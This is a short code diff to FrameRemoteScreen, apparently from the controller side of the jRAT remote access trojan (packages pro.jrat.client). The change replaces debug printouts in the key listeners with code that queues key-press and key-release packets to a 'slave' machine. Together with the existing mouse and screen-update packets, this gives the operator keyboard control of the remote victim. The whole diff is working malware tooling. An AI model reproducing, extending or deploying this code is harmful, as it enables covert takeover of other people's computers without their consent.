@@ -4,6 +4,10 @@ import java.awt.BorderLayout;
 import java.awt.Toolkit;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
+import java.awt.event.KeyAdapter;
+import java.awt.event.KeyEvent;
+import java.awt.event.MouseAdapter;
+import java.awt.event.MouseEvent;
 import java.awt.event.MouseMotionAdapter;
 import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
@@ -13,11 +17,10 @@ import java.util.HashMap;
 import java.util.Map;
 
 import javax.imageio.ImageIO;
-import javax.swing.Box;
 import javax.swing.DefaultComboBoxModel;
 import javax.swing.ImageIcon;
 import javax.swing.JButton;
-import javax.swing.JCheckBox;
+import javax.swing.JComboBox;
 import javax.swing.JFileChooser;
 import javax.swing.JFrame;
 import javax.swing.JLabel;
@@ -37,17 +40,13 @@ import pro.jrat.client.packets.outgoing.Packet50UpdateRemoteScreen;
 import pro.jrat.client.packets.outgoing.Packet91MouseMove;
 import pro.jrat.client.packets.outgoing.Packet92MousePress;
 import pro.jrat.client.packets.outgoing.Packet93MouseRelease;
+import pro.jrat.client.packets.outgoing.Packet94KeyPress;
+import pro.jrat.client.packets.outgoing.Packet95KeyRelease;
 import pro.jrat.client.threads.ThreadFPS;
 import pro.jrat.client.threads.ThreadRecordButton;
 import pro.jrat.client.ui.components.JRemoteScreenPane;
 import pro.jrat.client.ui.renderers.JComboBoxIconRenderer;
 import pro.jrat.client.utils.IconUtils;
-
-import javax.swing.JComboBox;
-import java.awt.event.MouseAdapter;
-import java.awt.event.MouseEvent;
-import java.awt.event.KeyAdapter;
-import java.awt.event.KeyEvent;
 
 @SuppressWarnings("serial")
 public class FrameRemoteScreen extends BaseFrame {
@@ -114,15 +113,17 @@ public class FrameRemoteScreen extends BaseFrame {
 		screenPane.getPanel().addKeyListener(new KeyAdapter() {
 			@Override
 			public void keyPressed(KeyEvent e) {
-				System.out.println(e.getKeyChar());
+				slave.addToSendQueue(new Packet94KeyPress(e.getKeyCode()));
 			}
+			
 			@Override
 			public void keyReleased(KeyEvent e) {
-				System.out.println(e.getKeyChar());
+				slave.addToSendQueue(new Packet95KeyRelease(e.getKeyCode()));
 			}
+			
 			@Override
 			public void keyTyped(KeyEvent e) {
-				System.out.println(e.getKeyChar());
+				
 			}
 		});
 		screenPane.getPanel().addMouseListener(new MouseAdapter() {
